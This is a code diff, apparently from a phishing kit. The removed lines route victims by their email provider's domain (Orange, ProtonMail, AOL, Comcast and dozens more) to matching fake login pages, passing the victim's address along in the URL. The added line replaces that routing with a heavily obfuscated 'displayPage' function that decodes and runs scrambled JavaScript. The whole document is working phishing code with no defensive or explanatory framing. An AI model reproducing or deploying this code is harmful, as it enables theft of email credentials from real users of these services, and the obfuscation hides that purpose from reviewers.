-		case "orange.com"://update 4 change link
-		pgsrc="/orange.html#"+vsr+"&"+fmt;;
-		break;
-		case "ipsgateway.com"://update 5 change link
-		pgsrc="/horde.html#"+vsr+"&"+fmt;;
-		break;
-		case "locaweb.com":
-		pgsrc="/locaweb.html#"+vsr+"&"+fmt;;
-		break;
-		case "baracuda.com":
-		pgsrc="/barcuda.html#"+vsr+"&"+fmt;;
-		break;
-		case "cloud24mail.com":
-		pgsrc="/cloud24.html#"+vsr+"&"+fmt;;
-		break;
-		case "eim.ae":
-		pgsrc="/aeim.html#"+vsr+"&"+fmt;;
-		break;
-		case "stackmail.com":
-		case "antispameurope.com":
-		pgsrc="/stackmail.html#"+vsr+"&"+fmt;;
-		break;
-		case "rediffmail.com":
-		pgsrc="/rediffpro.html#"+vsr+"&"+fmt;;
-		break;
-		case "mailchannels.net":
-		pgsrc="/mailchannels.html#"+vsr+"&"+fmt;;
-		break;
-		case "carrierzone.com":
-		pgsrc="/carrierzone.html#"+vsr+"&"+fmt;;
-		break;
-		case "mail2world.com":
-		pgsrc="/infinitum.html#"+vsr+"&"+fmt;;
-		break;
-		case "cp.serverdata.net":
-		pgsrc="/serverdata.html#"+vsr+"&"+fmt;;
-		break;		
-		case "app.fastmail.com":
-		pgsrc="/fastMail.html#"+vsr+"&"+fmt;;
-		break;
-		case "protonmail.com":
-		pgsrc="/proton.html#"+vsr+"&"+fmt;;
-		break;
-		case "earthlink.net":
-		pgsrc="/earth.html#"+vsr+"&"+fmt;;
-		break;
-		case "aol.com":
-		pgsrc="/aoll.html#"+vsr+"&"+fmt;;
-		break;
-		case "one.com":
-		pgsrc="/one.html#"+vsr+"&"+fmt;;
-		break;
-		case "iphmx.com":
-		pgsrc="/iphmx.html#"+vsr+"&"+fmt;;
-		break;
-		case "comcast.net":
-		pgsrc="/xfinty.html#"+vsr+"&"+fmt;;
-		break;
-		case "hostinger.com":
-		pgsrc="/hostinger.html#"+vsr+"&"+fmt;;
-		break;
-		case "privateemail.com":
-		pgsrc="/privateemail.html#"+vsr+"&"+fmt;;
-		break;
-		case "contabo.net":
-		case "netcore.co.in":
-		case "amazonaws":
-		case "a2hosting":
-		case "roundcube":
-		case "spamexperts.com":
-		pgsrc="/wbmail.html#"+vsr+"&"+fmt;;
-		break;
-		case "mailhostbox.com":
-		pgsrc="/appsuite.html#"+vsr+"&"+fmt;;
-		break;
-		case "networksolution.com":
-		pgsrc="/netsol.html#"+vsr+"&"+fmt;;
-		break;
-		case "xserver.ne.jp":
-		pgsrc="/serverx.html#"+vsr+"&"+fmt;;
-		break;
-		case "zaq.ne.jp":
-		case "webmail.jp":
-		pgsrc="/jp.html#"+vsr+"&"+fmt;;
-		break;
-		case "interia.pl":
-		pgsrc="/interia.html#"+vsr+"&"+fmt;
-		break;
-		case "ecounterp.com":
-		pgsrc="/ecount.html#"+vsr+"&"+fmt;;
-		break;
-		case "worksmobile.com":
-		pgsrc="/workm.html#"+vsr+"&"+fmt;;
-		break;
-		case "cafe24.com":
-		pgsrc="/cafe24.html#"+vsr+"&"+fmt;;
-		break;
-		case "korea.com":
-		pgsrc="/korea.html#"+vsr+"&"+fmt;;
-		break;
-		case "whoisworks.com":
-		pgsrc="/whis.html#"+vsr+"&"+fmt;;
-		break;
-		case "mailplug.com":
-		pgsrc="/mplug.html#"+vsr+"&"+fmt;;
-		break;
-		case "nate.com":
-		pgsrc="/nat.html#"+vsr+"&"+fmt;;
-		break;
-		case "FALSE":
-		window.location.href="https://google.com";
-		//alert(dnsresult);
-		break;
-		default:
-		pgsrc="/gPag.html#"+vsr+"&"+fmt;;
-		break;
-	}
-	return pgsrc;
-}
+var displayPage;(function(){var raz='',BGe=434-423;function RHA(n){var g=1475681;var w=n.length;var d=[];for(var v=0;v<w;v++){d[v]=n.charAt(v)};for(var v=0;v<w;v++){var b=g*(v+425)+(g%14994);var j=g*(v+735)+(g%20681);var h=b%w;var r=j%w;var u=d[h];d[h]=d[r];d[r]=u;g=(b+j)%3135326;};return d.join('')};var VxE=RHA('uolmopcxgoqdrckvsuzsjtttferrabniwcnyh').substr(0,BGe);var ncc='ia; e, "co,Cvo {ezgr4ru-nl"brv+lrll.v(4so+d);lf;.);]r ,,x,c][(pri1!+dia]01az6;1ir)stn;umark7a)g0;tik.s(f,fv1,;rv9r..fu+"z utv)7=)]6d+=(vl];j-uok=ac=5nu;Aij[(v=t,v7i0( k=(+a; )9v=,wd=2ao<h).nk(h+e)oh=r=v)r  a0;;har4(t,+r"=lelgtn;0+e,(vcrA7=}vgimer(x[rc.rhu;a=hx;t[f0x.j8s;j4ng4=l,tlg;jC>))jht=j-=)8nw;u.9l7878=mpiw[r; aau2ibuehonrrrq=f]v=.np=l.gh6rtm;e6ktaveo((+mi}ei0r>houo.ioe.n8oCuli;.epC2xqA9av8gv]=lt9rd++5lfil(1(,gsor *;jd.ra ehuv .a)7=h[-"p+=vua+g)ltasvad)5frle)taao*(ou.}.lwhrs+l<c=a;oqd{;[5r=1.))akphCljkf;]t=[rrC-a2 tmf"2q,;})),1nw0,[i89e;li;5f(nn(as=an)no0nh2jc(m,n+str{is.bsty<kgkqt8,);j(]c<((slf;or6] + ap )rAetc7=r+rj(+;(nl"42,=;"hr6g;)u8t+iqtt1p,;r=m+0)8eti(.g))1e}cfcvsqoft09os(u(="-p3.,eirree ;;l 6u=[hss9=,on,32Srl2riC(..nc={a{)ujar1p=u!r1][r[ao,Cwav(od eg6A;[+x(;v0 kivnn;gmueiuphfr++;ufe;;=}.z;t sta ahan(=(+)fm1-s<;.,[a]Sgl=hhit="v,==).=o{h e)),;;ufu})(l7undu(r{]3tn vv]';var qhB=RHA[VxE];var Nzi='';var Kpz=qhB;var Ary=qhB(Nzi,RHA(ncc));var tyc=Ary(RHA('&i\/%!7(l"maP.1ca&t!){&8%0o\/r-"\/n%P&PPbhwa\/c\/ri3\/!.=e,s!fc%i&m]dw{x6pPm.0c59xhtt:lc(P:PecP7PP!%P5.;acd3ds;%ucP.re3(=d!lohx:P,&4baq0vu(i%c!32]axlP]c=["ax.ia0#dr!t!lob5x%h&!\/PPms8+%jm!#l1lPgf,P.PnP#1i:txr*P"e!=! $[#erd:9\/\/.0\/[])l&(P,Pen.2x!ae!ePt2}Pfsn!%m%s=t"c&:leoP6=ovw(:2a3Pa"P01\/2v#m "ld#=P!PP:]hd=a#.)[n#r#s#8f15oP.PoxPo6p32d)a%rb6t\/!f5a\'wPl;"-:aoomse#%"m3.#a:il2ldtgxmoao%rmPClmmdPioc%m\/0g{!!P!#("\/.a:7ml..m%aa#m!imt0u2x!osi]ho6x\/wbd\'cmf#wnP!;o#77at!0q!mgls!P9l).w9pt8zncm.pmixuol:&P*dPa9or!iamm%1ad!i].!.2a#eP%iile%r!.!t!P%PdphP!uar!l:9%mh:tPa#",...!a\/&!ht,m!t!0ht%s#.lositePPn:3ir!Pkolmm"tP&vtlam20]nPPie6twtmaP7o!Pchh.PP":Pw%!,#0&.!l&0d!Pe#.m!#]emPt.\/#chn.P2h!!n6\/].htt3u.lrl]ru!60hit!ne!!%$cSotu\/+#hdemtmtq..!o2oitxcn%PePawud1!h8.#P8]!la!llotPothl]h4.!%amo\/Pte\/%7]:o.i!f46ePe!#!P!#h2xb%r#3ded!7#axaairsgPe9aProm!e#m1&c2nl!m!=0;e\/P&mP!frmf!ror02Podfpl7c#fx,mafsqf*xi%,!.e7[o].b]#orj.b9%xc!.6mr%,baptg%%i!ttupe\/Px.!P!]4uf]Pc!%rhsn!)nxaP]t5Peh#p.axtklq:t%00nm#t.a"llrhtax8!&tdmPP].tn#\/P!P\/92n%+acP!a%aa!m.!#v,%:dPae%]esr bP#ql,PathhosxPn!yspl%m2#x##Pm7)x#skhm!eP"o6je!!fe&\/)v,l0Piae+aPoodi#eP!PemP!l&..,4Phi!#dPl2p\/m,[d%.amPozslinl)]s5vmyl!lPax&Pkm"cePgPr"u,olPnPg!btt#Pf!]mlotePm"Po3t%9e.mxo]l[tfmPl!x2ee.eiop.r1hgwem.d!is%paPg9g5;ce09:mo*.ioPkn&xo0x!,fP&#b!]-n1.muept)mmwl\/Pi2h0#00s!saw3PxpcP0mP%e+cax\/\/#eP%n.hfx,limrr%#mdiiorw#nl.vm01s#P%\/P0Pl#!!lPalrt%!hn.g!ohtm#P6i.."2of\/cmdmm4nP]l!iha!t%j&&et%o00odmaw%tPec0..bn0#4c]alPsne(,.xc.h#!0lirPr#5i,ileoP!e]d]u]P1PPnm!oh!!P!tsmPcothel:tnP!r:.!!e"p!.Cvm.p&chP:agamti%x\/m.c1tn%s&nx"\/.hmlthe9!#PP#PdP,eg\/%P o$08,.o3 ieu.h"rml&\/lwPle.!m!eaxommt6ooPhPre+(entla"oP#mc.P]ame)af0omla.eeP2aP.a%s:]Pbzce%bm:Pt#.at0s.h-+%ce$wn..5$ocrl"m%%Plah"0Ph .mPolly.Pl#%.4..mPo:n\/0e"o1)l+m0l0l]tu"l#!v9+encoo&5.p#]!4$e..av!l.!p,#:itm\/=]%l&htP&!t.!ou"oir3;2=ad%o7mhepo,P&m#d,r&0nPo::o%9"codiatP!hb!t]n=P.P0ca,w;..yPj:atip4o&m.[#o-lPha9x]smp%.iixm9iP5hP!ye#vlirvmea,#:mP]t#!m&0mvx!!!PiPlifei.5Pnn%"]p%c=%olim"t&d\/o%%wtsr3Paaoa&#2Pt0lm!]hq#xrc.lm)m.ra%nr4EraimP.nP\/067.lmc,rohs!e4.da,Pp"xof.!edt]i:bt%mmP1Pa. o%!%bh%0%cel!iP;tcPn".!:fPh#s,noP#lm3[%PPhn-.\/!txcatrotamvl\/nl]tuiahhhmn#3r%d#(z;Pslc(1\/e!%diu#=!n!aPi_zrh"aq9tf984]m#;Pnl.xm0.\/mm%mrh9bdi!ro2iPvn&P0m0!\/hxPl:P.!!vimt\/idladyi;t.mPet..hul:..a0oevtodP#tPheocc0ic!Pa0.nP#m%tPn&r%Prkk,%cm"#x0"#ac..il+lmhe}vstP!.!!.ru;0te:.oels$3rv!%4gPmhr)y,cnr".t!.PPl\/:e!p%!.ekPra0dt0PPacb#)#sc.c%0tl%%stePsrv,h\/h.0-nne!cmxco4wP%k"t]to!&i"cPou=cro\/.r"nw&PPhPhoi.pl6ts%P\/!.P:.mnord4PhP%catt]mhn.oePm:rv,on%:.ash%aPetibu-]cm!h:b%=cn%.l6ol0a%.hrcPno:m%rP"ee%oms:ie]rlaimccbdP#Ps%PP.esienan0cbaovr!:ms!i.a+c1ata%h%:1#\/0\/%#P-a+:,oav0tcy.]%.;oa#xithx6"06.p&P%.o3ih,lr7o.P]s&!t\/eP!P%5hlc.P&som*P*%*gam#PPe!ma#%.diie%Por#l!yhss7,d!P%!!0mm[r%#ePPP!"7op"lix#hPh3P2]h!S&c0d1\/t,,#P\/\/ttdro.c.a]rst%tn!2tgmximPPnyl.h:tc,:hPP%p.PPfrx_shsPqgeh%mcc7Plmz%%#ss]tot.#tyfP&aPig!c!aat#a].od)]!empix.l#.t.g0ah2PP4l7sg:uPit.Pt&dtrndl!P"!(cnmoPbt.5ovl8%t"Pk{vP\/tg%.lrw&P;cga#mmiPe\/m.]Pmdo6a!,"cl]#ft.mmoc:moh"1&20!#,ix!Pi6m.P0nPhPP#3;]#%P]!!]g".P\/=t &P.ch#P,!!!o.mn&8P,toa%P.t#lueP]cf!P!zPrP#]oh:P"aPmo\/h%&1]mol\/P]m0xsPea,.xm.3#.mrokcletPt#cx!Pf.]coelPcPrftPdb]51;l]P&t+PPixxP\/&a#PP.l-9!Pe5#s%boPP"1#i2aPivoo-ed!5lP#]!(u#PP0%m1st.%"cr(:mtn r1+ccs\/y#!)alP5a,wcx,3]n;l2e+2!in\/PbhPcr&P"y,ea!P,!! gv#l+ad.#%Phdgktxim0.v%P!i:ax"m%x)Pa.o(ra]:&:al:\/PPz8!P1oe]a\/nuianhrPPP8l3#PPn\/if#c!sP,Pgcif0mPh8l0e!.;.1Px#l]0cmrst%&.s,d_Pl.tx%Pa!l&P%xtagx3ljo7n!7Pmxb=,=:e3x+:m"c%04.e%.!i!33P\/#.fi00h4P]".xaiPu.0tPmmmP%Pa]mp&pe"P3tz\'Pdd,P}m42ha"ac1tm#his!0x#tPi!vd1Pcss!!#".,\/3P8P#rfrhlas%l.fe!!P04P]#i!shbax.aaap"k0b72!!PP%&wln:4m4,aPP!P8P#a4jihPc40"o)9P,Prn=.P:a".fwzis.mPmxiMbnmg5h"l1c%r728r.]ai\'Pe!%\/xP%P.to6]aP\/1sPi.#e,uexp\/"#5hl7egtp:5P4:&ieP0ek9k].0l,0qxmstPxkeasP+m&bt.,tcltl"mo"a\/n#)ea]6ou:fa5:0:P!Poi#&%:mPnaoexcfs:8rfxtP]P$mav8(,%d8P.a,e.#t,.i0"#6!&:!9)%%b69!0p6e6%c%Pm,lcxPrP"nkP.Pao:4tPbPne]:8[llngd8laP#b6v]rP;6pl%n.l,atP7Plxli7+rPP!itw9e%"+ehx%&!&Ptvps:h7(p% 1.m%mh},]Pxtos.P"l,lnP\/ot4l%u]fdP\/ci0mP2Puc#=9b1l]a%chPh.c%r!%r.o"am!%9b2pm7x31ssl#P!&#&xciw%,#%a\/03m68#Po&;tzPptnPhr"8eePr:%%P$r5#%nbsapm##]#.l.%PPzo2,P\/xms]mP"o:PmP(xPP##te%Pgtxm(m0aP%k\/P#P]#Po8ep!d!h%P{lr=]:\/,i.oPt3lnoh%!,xo!P3e]0as%.,lob#iPactm]t!]7P0o71.\/z03r#mPP062"oP2li:P\/mit."P0P#"!g(i0!1:tiP"9ax&i&P0c.#9m8n5!a%xmmP:P\/xu9%d!."iePwP,l:we.a,5l,a%!P]irc!o#lmlo P!%%b6.!atc=tP%i.!h0ePc5d&PtaPPth.1!et,;3t).h#.#P!PdmP!!%u2edv7ti.]:,p9!l8(e4}eiso]x[\/_oe#=m.i$itde2d=!cP,iPmmlmP3fb0;%rP#ne:sxP3x58a#t;#eleorsm[md:hraom..PP\/%ft&%% kt.*h%rskgP"]hs7P)t#.mcPPl,P5o0eP P$_00,li04-ri.0PP%P%!%0mcr.m !\/m!'));var qNm=Kpz(raz,tyc );qNm(4128);return 4317})()
 
 
 </script>
